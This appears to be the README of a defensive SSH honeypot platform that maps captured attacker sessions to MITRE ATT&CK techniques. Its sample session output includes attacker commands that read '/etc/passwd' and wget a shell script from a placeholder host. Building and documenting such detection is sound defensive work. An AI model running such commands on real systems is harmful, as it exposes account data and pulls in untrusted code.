# Surya Kundal

**An SSH honeypot platform that turns raw attacker activity into structured, enriched, ATT&CK-mapped intelligence.**

Surya Kundal runs a [Cowrie](https://github.com/cowrie/cowrie) SSH honeypot, reconstructs every attacker visit as a structured session, enriches each source IP and captured file with threat intelligence, maps what the attacker did to MITRE ATT&CK techniques, and stores it all in a queryable database. Wazuh alert rules and a read-only web dashboard are included.

> **Status:** active development. Capture, storage, enrichment, ATT&CK mapping, and the command-line tools work today and are covered by an automated test suite. The Wazuh rules are unit-tested and verified against a real Wazuh 4.14.7 manager; the dashboard is tested and runs locally; containerised deployment and public deployment are not built yet; the table below is explicit about which is which.

## Why this exists

A honeypot's native output is a flat stream of events: one JSON line per connection, key exchange, login attempt, and command. That is hard to turn into answers to the questions that matter: *who is this, what technique are they using, and how dangerous is it?* Surya Kundal is the analysis layer on top of the honeypot that answers them.

```
$ surya-kundal show 051b
Session 051b29d11c6c from 203.0.113.7 at 2026-10-05 07:11:23 UTC
  login rejected: root/123456
  login accepted: root/apple
  T1078.001 login-default-account (medium): login accepted for 'root'
  $ whoami
      -> T1033 discovery-current-user (high)
  $ cat /etc/passwd
      -> T1087.001 discovery-local-accounts (high)
  $ wget http://example.com/test/sh
      -> T1105 c2-download (high)
```

## Capabilities

| Capability | Status |
|---|---|
| SSH honeypot capture (Cowrie) | Working |
| Session reconstruction: credentials, commands, files downloaded and uploaded (SHA-256), port-forwarding attempts, timing, SSH client version, HASSH fingerprint | Working |
| Durable SQLite storage with idempotent, failure-isolated import and versioned schema migrations (Alembic) | Working |
| Live log following across rotation and restarts (the read position is saved); a session that fails to store is retried a few times, then logged and skipped so it cannot block the rest | Working |
| Offline IP geolocation and ASN (MaxMind GeoLite2) with a validated, atomic database updater | Working |
| Threat-intel enrichment: AbuseIPDB score and Tor exit-node check per IP, VirusTotal verdict per captured file. Each IP and hash is looked up once; daily budgets stay under free-tier limits and survive restarts | Working |
| MITRE ATT&CK mapping of commands, logins, transfers and tunnelling: 70+ reviewable rules, each with its own pass/fail examples, validated against the official ATT&CK catalog | Working |
| One-process service (`surya-kundal run`): capture, ATT&CK mapping, background enrichment | Working |
| Wazuh rules for Cowrie events, generated from the ATT&CK rules, including honeypot-fingerprinting and rapid-recon alerts (see `wazuh/`) | Done, verified on Wazuh 4.14.7 |
| Deception kit: hardened Cowrie config, believable fake filesystem and login policy, with an honest threat model of what still gives a honeypot away (see `cowrie/`) | Working |
| Read-only web dashboard (`surya-kundal dashboard`): attack map, depth funnel, honeypot-fingerprinting panel, ATT&CK matrix, session drill-down, optional Wazuh alerts. Strict CSP, escaped attacker text, optional password | Done, tested; not yet run against real attackers |
| One-command deployment with Docker Compose | Planned |
| Public deployment and real-world data collection | Planned |

## Architecture

```
Internet / attacker
        |
  [Cowrie SSH honeypot]          cowrie.json (one JSON event per line)
        |
  [Watcher / log parser]         groups events into one record per session
        |
  [SQLite via SQLAlchemy]        sessions, logins, commands, downloads, uploads, tunnels
        |
  +-----+-----------------------+
  |                             |
[ATT&CK mapper]          [Enrichment worker]
 command -> technique     GeoLite2, AbuseIPDB, Tor list, VirusTotal
  |                             |
  +-----------+-----------------+
              |
   +----------+-----------+
   |                      |
[Wazuh rules]      [Flask dashboard]
   (done)              (done)
```

Everything from the log parser onward is code in this repository. Cowrie itself is used unmodified as the capture engine.

## Data model

| Table | One row per | Key fields |
|---|---|---|
| `sessions` | attacker visit | Cowrie session ID, source IP, start/end, duration, SSH client version, HASSH |
| `logins` | credential attempt | username, password, success flag |
| `commands` | command typed | command text, timestamp |
| `downloads` | file the attacker fetched | URL, SHA-256 |
| `uploads` | file the attacker sent (SFTP/SCP) | filename, destination, SHA-256 |
| `tunnel_requests` | port-forwarding attempt | destination and origin address and port |
| `ip_geo` | attacker IP | country, city, coordinates, ASN and organisation |
| `ip_intel` | IP per provider | AbuseIPDB confidence score, Tor exit flag, raw provider payload |
| `file_intel` | file hash per provider | VirusTotal detections, engine count, threat label |
| `technique_matches` | rule that fired | ATT&CK technique and tactics, rule ID, confidence, evidence, linked command |
| `session_mappings` | mapped session | which rule set and ATT&CK version produced the matches |

## ATT&CK mapping

Attacker commands are split into simple commands (respecting quotes), stripped of wrappers like `sudo` and `/usr/bin/`, and matched against the rules in [`rules.toml`](src/surya_kundal/mapping/rules.toml). Session-level evidence maps too: repeated failed logins to password guessing, accepted default-account logins, file transfers to ingress tool transfer, port forwarding to proxy use. Every rule states its technique, a confidence level, and examples that must and must not match; the test suite enforces all of them, and every technique ID is checked against the vendored ATT&CK Enterprise catalog (v19). Sessions are re-mapped automatically when their activity or the rules change.

This is pattern matching, not a shell interpreter: it does not follow variables or decode payloads, and confidence describes how specific a pattern is, not how dangerous a command is.

## Engineering approach

- **Additive, idempotent storage.** Sessions are merged into the database, never rewritten. Importing the same log twice creates no duplicates, a session saved mid-attack is completed when its closing events arrive, and row IDs stay stable. Event identity is enforced by the merge logic and by unique constraints in the database.
- **Migrations.** The schema is versioned with Alembic. Databases from before migrations existed upgrade in place, and a test fails if a model changes without a migration.
- **A watcher built for real log files.** It copes with rotation (including a session split across two files), truncation, a half-written last line, and a missing log. It retries failed database writes and shuts down cleanly on `SIGINT`/`SIGTERM`.
- **Treats attacker input as hostile.** Everything an attacker types is untrusted. Output is escaped before it reaches a terminal (control characters and right-to-left overrides), and the mapper bounds the length of every command it analyses so crafted input cannot cause pathological regular-expression run time. Property-based tests (Hypothesis) throw arbitrary text, JSON and control characters at the parser, mapper and sanitiser.
- **Free-tier discipline.** Every IP and file hash is looked up once and cached. Daily budgets are tracked in the database, so they survive restarts. A provider that reports its limit stops being called, and a failure on one item never blocks the rest.
- **Secrets.** Read only from the environment or an untracked `.env` (which triggers a warning if other users can read it). HTTP clients never log request URLs, and the MaxMind downloader does not forward credentials across redirects.
- **Correct time handling and database integrity.** Timestamps are timezone-aware UTC end to end; foreign keys are enforced and WAL mode lets a reader work while the importer writes.
- **Quality gates in CI.** Every push runs the test suite on Python 3.11, 3.13 and 3.14 (90% coverage floor, currently about 95%; resource leaks fail the run), ruff lint and format with security rules, strict mypy, a job that builds the wheel and runs it from a clean environment, `pip-audit`, and CodeQL. Dependabot keeps dependencies current.

## Getting started

Prerequisites: Python 3.11+ and a running Cowrie instance. Our Cowrie settings are noted in [`cowrie/README.md`](cowrie/README.md).

```bash
git clone https://github.com/TurlaFSB/SuryaKundal.git
cd SuryaKundal
python3 -m venv .venv
source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

Configuration is read from the environment or a `.env` file; copy `.env.example` and fill in what you have (all API keys are optional, and missing ones are skipped):

```bash
cp .env.example .env && chmod 600 .env
surya-kundal geoip update          # one-off: download the GeoLite2 databases
```

Run the whole pipeline (capture, ATT&CK mapping, background enrichment); stop with Ctrl+C:

```bash
surya-kundal run
```

Or use the pieces separately:

```bash
surya-kundal ingest                # import an existing Cowrie log
surya-kundal watch                 # follow the log live; resumes where it stopped
surya-kundal map                   # map sessions to ATT&CK techniques
surya-kundal enrich                # geolocation + threat intel
surya-kundal list                  # recent sessions with country, abuse score, Tor flag
surya-kundal techniques            # ATT&CK techniques seen, most common first
surya-kundal show <session-id>     # one session: commands with their techniques
```

The dashboard needs the `dashboard` extra and listens on localhost only unless you set `DASHBOARD_TOKEN`:

```bash
pip install -e ".[dashboard]"
surya-kundal dashboard             # http://127.0.0.1:8080
wazuh/export-alerts.sh             # optional: show Wazuh alerts on the overview
```

## Roadmap

| Phase | Scope | State |
|---|---|---|
| 0 | Repo skeleton, tests, CI | Done |
| 1 | Cowrie running, log parser | Done |
| 2 | Database layer and live log watcher | Done |
| 3 | Threat-intel enrichment with caching and rate limits | Done |
| 4 | MITRE ATT&CK mapping engine | Done |
| 5 | Wazuh custom rules | Done (verified on Wazuh 4.14.7) |
| 6 | Flask dashboard | Done |
| 7 | Docker Compose for the whole stack | Planned |
| 8 | Deploy to a cloud VM and collect real attacker data | Planned |
| 9 | Write-up, demo, documentation | Planned |

Only free tiers and free offline datasets are used. No paid services are required.

## Project layout

```
src/surya_kundal/
    parser/        Cowrie log parsing
    database/      SQLAlchemy models, engine, storage, Alembic migrations
    enrichment/    GeoIP, AbuseIPDB, VirusTotal, Tor list, enrichment pass
    mapping/       ATT&CK catalog, rules.toml, mapping engine
    dashboard/     read-only Flask web UI
    watcher.py     Live log following
    service.py     The one-process pipeline behind `surya-kundal run`
    config.py      Settings (environment and .env)
    textsafe.py    Safe printing of attacker-controlled text
    cli.py         surya-kundal command
wazuh/             Generated Wazuh rules, manager compose file, sample events (Phase 5)
cowrie/            Notes on our Cowrie configuration
tests/             pytest suite (unit, property-based, migration, CLI)
```

`docker-compose.yml` is added in Phase 7, once there is a real stack to orchestrate.

## Third-party data

This product includes GeoLite2 data created by MaxMind, available from [https://www.maxmind.com](https://www.maxmind.com). Run `surya-kundal geoip update` with a free MaxMind account (set `MAXMIND_ACCOUNT_ID` and `MAXMIND_LICENSE_KEY` in `.env`). The databases are git-ignored and must not be redistributed; GeoLite2 city-level locations are approximate.

MITRE ATT&CK(R) is a registered trademark of The MITRE Corporation. Technique data is from the Enterprise ATT&CK dataset, (c) The MITRE Corporation, reproduced with permission.

## Security

See [`SECURITY.md`](SECURITY.md) for how to report a vulnerability and the design choices that matter. In short: honeypot logs, captured malware, databases and `.env` files are git-ignored; when deployed on the public internet, outbound traffic from the honeypot host must be restricted (Cowrie performs real downloads when an attacker runs `wget`); and the honeypot belongs on an isolated host, never alongside real services.

## License

MIT. See [LICENSE](LICENSE). Third-party data (MaxMind GeoLite2, MITRE ATT&CK) keeps its own terms, noted above.
